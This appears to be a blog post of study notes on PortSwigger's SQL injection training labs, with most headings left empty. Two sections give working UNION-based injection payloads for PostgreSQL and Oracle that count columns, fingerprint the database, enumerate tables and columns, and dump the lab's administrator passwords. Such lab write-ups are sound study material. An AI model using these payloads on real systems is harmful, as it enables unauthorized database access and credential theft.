---
title: SQL injection
tags:
  - 渗透
abbrlink: 8b56535a
description: SQL injection based on PostSwigger Lab
date: 2024-03-17 00:26:00
---

[PostSwigger Lab - SQL injection](https://portswigger.net/web-security/sql-injection)

**Tools**：BurpSuite，Chrome，switchyomega

## 0x00 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## 0x01 SQL injection vulnerability allowing login bypass

## 0x02 SQL injection attack, querying the database type and version on Oracle

## 0x03 SQL injection attack, querying the database type and version on MySQL and Microsoft

## 0x04 SQL injection attack, listing the database contents on non-Oracle databases
***End Goals***:
- Determine the table that contains usernames andpasswords
- Determine the relevant columnsOutput the content of the table
- Login as the administrator user

***Analysis***:
1. Find the number of columns
`' order by 3--` -> Internal server error -> 3-1=2
2. Find the data type of the columns
`' UNION select 'a','a'--` -> both columns accept type text
3. Version of the database
    - `' UNION SELECT @@version, NULL--` -> not Microsoft
    - `' UNION SELECT version()，NULL--` ->200 0K `PostgreSQL 12.17 (Ubuntu 12.17-0ubuntu0.20.04.1)`
4. Output the list of table names in the database
    `' UNION SELECT table_name, NULL FROM information_schema.tables--` -> search `users` -> `users_vqrxmy`
5. Output the column names of the table
    `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_vqrxmy'--` -> `password_bfrqkp` and `username_rwstyz`

6. Output the usernames and passwords
`' UNION select username_rwstyz, password_bfrqkp from users_vqrxmy--` -> `administrator` and `lftog9bgwjw81hj0feiy`


## 0x05 SQL injection attack, listing the database contents on Oracle
***End Goals***:
- Determine which table contains the usernames and passwords
- Determine the column names in table
- Output the content of the table
- Login as the administrator user

***Analysis***:
1. Determine the number of columns
`' order by 3--` -> Internal server error -> 3-1=2
2. Find the data type of the columns
Oracle database -> `' UNION select 'a','a' from DUAL--` -> both columns accept type text
3. Output the list of tables in the database
`' UNION SELECT table_name, NULL FROM all_tables--` -> search `users` -> `USERS_MQOBSV`
4. Output the column names of the users table
`' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_MQOBSV'--` -> `USERNAME_APTSKD` and `PASSWORD_QXOINH `
5. Output the list of usernames and passwords
`' UNION select USERNAME_APTSKD, PASSWORD_QXOINH from USERS_MQOBSV--` -> `administrator` and
`dvqljtgry480ary2i1iu`

## 0x06 SQL injection UNION attack, determining the number of columns returned by the query

## 0x07 SQL injection UNION attack, finding a column containing text

## 0x08 SQL injection UNION attack, retrieving data from other tables

## 0x09 SQL injection UNION attack, retrieving multiple values in a single column

## 0x0A Blind SQL injection with conditional responses
***End Goals***:

***Analysis***:

## SQL injection with filter bypass via XML encoding